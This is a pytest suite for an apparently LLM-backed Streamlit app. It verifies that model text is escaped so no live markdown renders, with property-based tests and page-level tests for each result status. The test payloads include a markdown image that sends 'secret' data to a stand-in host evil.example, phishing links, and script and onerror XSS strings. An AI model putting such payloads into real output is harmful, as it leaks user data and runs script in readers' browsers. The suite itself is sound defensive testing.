"""LLM text is shown as plain text: no live links, images or markdown (finding S-06)."""

import re
import string

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from skysnap_ask.text import escape_markdown

PUNCTUATION = set(string.punctuation)


def unescape(text: str) -> str:
    """Undo CommonMark backslash escapes (a backslash before ASCII punctuation)."""
    return re.sub(r"\\([!-/:-@\[-`{-~])", r"\1", text)


def unescaped_punctuation(text: str) -> list[str]:
    """Punctuation characters not preceded by an escaping backslash."""
    found = []
    i = 0
    while i < len(text):
        if text[i] == "\\" and i + 1 < len(text) and text[i + 1] in PUNCTUATION:
            i += 2
            continue
        if text[i] in PUNCTUATION:
            found.append(text[i])
        i += 1
    return found


@pytest.mark.parametrize(
    "payload",
    [
        "![t](https://evil.example/p.png?d=secret)",
        "[click me](https://evil.example/phish)",
        "see https://evil.example/x for details",
        "<script>alert(1)</script><img src=x onerror=alert(2)>",
        "[ref]: https://evil.example",
        "<https://evil.example>",
        ":green[trusted] **bold** _it_ `code` # heading > quote",
        "| a | b |\n|---|---|",
    ],
)
def test_nothing_in_the_output_is_live_markdown(payload):
    out = escape_markdown(payload)
    assert unescaped_punctuation(out) == []
    assert unescape(out) == payload


def test_plain_words_digits_spaces_newlines_and_unicode_are_unchanged():
    text = "Delhi was hottest on 12 October at 31 degrees\n日本語 🌧️ café"
    assert escape_markdown(text) == text


def test_a_literal_backslash_survives():
    out = escape_markdown("a\\b")
    assert unescape(out) == "a\\b" and unescaped_punctuation(out) == []


def test_empty_and_none_like_values():
    assert escape_markdown("") == ""


@settings(max_examples=300, deadline=None)
@given(st.text())
def test_escaping_is_lossless_and_leaves_no_live_punctuation(text):
    out = escape_markdown(text)
    assert unescape(out) == text
    assert unescaped_punctuation(out) == []


# ---- through the real page -------------------------------------------------------------

EVIL = "![x](https://evil.example/p.png?d=1) [a](https://evil.example) https://evil.example www.evil.example"


@pytest.mark.parametrize("status", ["answered", "refused", "failed"])
def test_page_shows_model_text_without_live_links_or_images(monkeypatch, status):
    from pathlib import Path

    from streamlit.testing.v1 import AppTest

    from skysnap_ask.service import AskResult

    from .fakes import FakeService

    for key, value in (("GEMINI_API_KEY", "t"), ("GEMINI_MODEL", "m"), ("GEMINI_EMBED_MODEL", "e")):
        monkeypatch.setenv(key, value)
    result = AskResult(
        question="q",
        status=status,
        sql="SELECT 1" if status == "answered" else None,
        columns=["c"],
        rows=[(1,)],
        answer=EVIL,
        error=f"Blocked: function {EVIL} is not allowed",
    )
    app = Path(__file__).resolve().parents[2] / "app" / "streamlit_app.py"
    at = AppTest.from_file(str(app), default_timeout=30)
    at.session_state["service"] = FakeService(result)
    at.run()
    at.text_input[0].set_value("q").run()
    at.button(key="ask").click().run()
    assert not at.exception
    shown = {"answered": at.success, "refused": at.info, "failed": at.error}[status]
    text = shown[0].value
    assert unescaped_punctuation(text) == []
    assert not re.search(r"\]\(|!\[|://", text)
